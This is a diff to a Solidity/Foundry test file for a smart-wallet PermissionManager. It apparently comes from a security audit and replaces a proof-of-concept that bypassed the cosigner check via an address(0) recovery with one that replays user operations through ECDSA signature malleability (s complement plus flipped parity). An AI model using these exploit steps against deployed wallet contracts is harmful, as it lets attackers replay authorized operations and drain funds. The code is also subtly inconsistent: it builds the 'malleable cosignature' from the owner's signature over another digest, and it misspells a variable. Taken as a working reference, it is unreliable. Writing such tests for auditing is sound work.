@@ -33,6 +33,8 @@ contract PermissionManagerBase is Test {
         account.initialize(owners);
         successPermissionContract = new MockPermissionContract(false);
         failPermissionContract = new MockPermissionContract(true);
+        vm.prank(owner);
+        permissionManager.setPaymasterEnabled(address(0x42), true);
     }
 
     function _createPermission() internal returns (PermissionManager.Permission memory) {
@@ -40,7 +42,7 @@ contract PermissionManagerBase is Test {
             account: address(account),
             chainId: block.chainid,
             expiry: type(uint48).max,
-            signer: abi.encode(cosigner),
+            signer: abi.encode(permissionSigner),
             permissionContract: address(successPermissionContract),
             permissionValues: hex"",
             verifyingContract: address(permissionManager),
@@ -60,24 +62,27 @@ contract PermissionManagerBase is Test {
             uint256(uint160(address(permissionManager))), // verifyingContract
             uint256(0x160), // bytes approval ofs
             uint256(0x20), // bytes signer len
-            abi.encode(0), // bytes signer content
+            abi.encode(permissionSigner), // bytes signer content
             uint256(0x0), // bytes permissionValues len
             uint256(0x0) // bytes approval len
         ));
     }
 
-    function _createUserOp() internal returns (UserOperation memory) {
+    function _createUserOp(PermissionManager.Permission memory permission) internal returns (UserOperation memory) {
         UserOperation memory userOp;
 
         userOp.sender = address(account);
         userOp.nonce = 4337;
+        address paymaster = address(0x42);
+        userOp.paymasterAndData = abi.encodePacked(paymaster);
 
-        // `bob` is set as recovery.
+        CoinbaseSmartWallet.Call[] memory calls = new CoinbaseSmartWallet.Call[](1);
+        bytes memory beforeCallsData = abi.encodeWithSelector(PermissionManager.beforeCalls.selector, permission, paymaster, cosigner);
+        calls[0] = CoinbaseSmartWallet.Call(address(permissionManager), 0, beforeCallsData);
+
         userOp.callData = abi.encodeWithSelector(
             CoinbaseSmartWallet.executeBatch.selector,
-            address(account),
-            0,
-            abi.encodeWithSelector(PermissionCallable.permissionedCall.selector, '')
+            calls
         );
 
         return userOp;
@@ -99,42 +104,76 @@ contract PermissionManagerBase is Test {
         assertEq(nonstandardPermission.account, address(account));
         assertEq(nonstandardPermission.chainId, block.chainid);
         assertEq(nonstandardPermission.expiry, type(uint48).max);
-        assertEq(nonstandardPermission.signer, abi.encode(0));
+        assertEq(nonstandardPermission.signer, abi.encode(permissionSigner));
         assertEq(nonstandardPermission.permissionContract, address(successPermissionContract));
         assertEq(nonstandardPermission.permissionValues, hex"");
         assertEq(nonstandardPermission.verifyingContract, address(permissionManager));
         assertEq(nonstandardPermission.approval, hex"");
 
-        // use cosigner == address(0) and intentionally recover to address(0) with v != 27/28
         bytes32 nonstandardPermissionHash = permissionManager.hashPermission(nonstandardPermission);
         bytes32 replaySafeHash = account.replaySafeHash(nonstandardPermissionHash);
 
         // user approves a permission
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, replaySafeHash);
-        bytes memory permSig = abi.encodePacked(r, s, v);
-        bytes memory approval = account.wrapSignature(0, permSig);
+        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
+        bytes memory approval = account.wrapSignature(0, ownerSig);
         nonstandardPermission.approval = approval;
 
         // register the permission
-        vm.expectEmit(address(permissionManager));
-        emit PermissionManager.PermissionApproved(address(account), nonstandardPermissionHash);
-        permissionManager.approvePermission(nonstandardPermission);
-        vm.assertEq(permissionManager.isPermissionAuthorized(nonstandardPermission), true);
+        // vm.expectEmit(address(permissionManager));
+        // emit PermissionManager.PermissionApproved(address(account), nonstandardPermissionHash);
+        // permissionManager.approvePermission(nonstandardPermission);
+        // vm.assertEq(permissionManager.isPermissionAuthorized(nonstandardPermission), true);
+    }
 
-        // malicious userOps can be executed, abusing an existing permission by bypassing cosigner authentication
-        UserOperation memory userOp = _createUserOp();
+    function test_malleableCosignature() public {
+        _etchEntrypoint();
+        _initializePermissionManager();
+
+        PermissionManager.Permission memory permission = _createPermission();
+
+        bytes32 permissionHash = permissionManager.hashPermission(permission);
+        bytes32 replaySafeHash = account.replaySafeHash(permissionHash);
+
+        // user approves a permission
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, replaySafeHash);
+        bytes memory ownerSig = _getSignature(replaySafeHash, ownerPk);
+        bytes memory approval = account.wrapSignature(0, ownerSig);
+        permission.approval = approval;
+
+        // malicious userOps can be executed by replaying them via malleable cosigner signatures
+        UserOperation memory userOp = _createUserOp(permission);
         PermissionManager.PermissionedUserOperation memory permissionedUserOp;
         permissionedUserOp.userOp = userOp;
-        bytes memory uoSig = permSig;
-        permissionedUserOp.userOpSignature = uoSig;
-        bytes memory uoCosig = abi.encodePacked(r, s, uint8(0)); // recovers to 0
-        permissionedUserOp.userOpCosignature = uoCosig;
-        permissionedUserOp.permission = nonstandardPermission;
+
+        // entryPoint.getUserOpHash(userOp)
         (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
         bytes32 userOpHash = bytes32(ret);
-        address rec = ecrecover(userOpHash, uint8(0), r, s);
-        assertEq(rec, address(0x0));
-        // bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
+
+        bytes memory uoSig = _getSignature(userOpHash, permmissionSignerPk);
+        permissionedUserOp.userOpSignature = uoSig;
+
+        bytes memory uoCosig = _getSignature(userOpHash, cosignerPk);
+        permissionedUserOp.userOpCosignature = uoCosig;
+        permissionedUserOp.permission = permission;
+        
+        bytes4 canonicalEIP1271Val = bytes4(0x1626ba7e);
+        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
+        assertEq(magicValue, canonicalEIP1271Val); // signature is valid on first pass
+        
+        // construct malleable signature complement
+        uint256 SECP256KN = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
+        uint256 sComplement = SECP256KN - uint256(s);
+        uint8 yParityFlipped = v == 0x1b ? 0x1c : 0x1b;
+        permissionedUserOp.userOpCosignature = abi.encodePacked(r, sComplement, yParityFlipped);
+
+        bytes4 magicValueFromMalleableCosignature = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
+        assertEq(magicValueFromMalleableCosignature, canonicalEIP1271Val);
+    }
+
+    function _getSignature(bytes32 digest, uint256 privateKey) internal pure returns (bytes memory) {
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
+        return abi.encodePacked(r, s, v);
     }
 
     
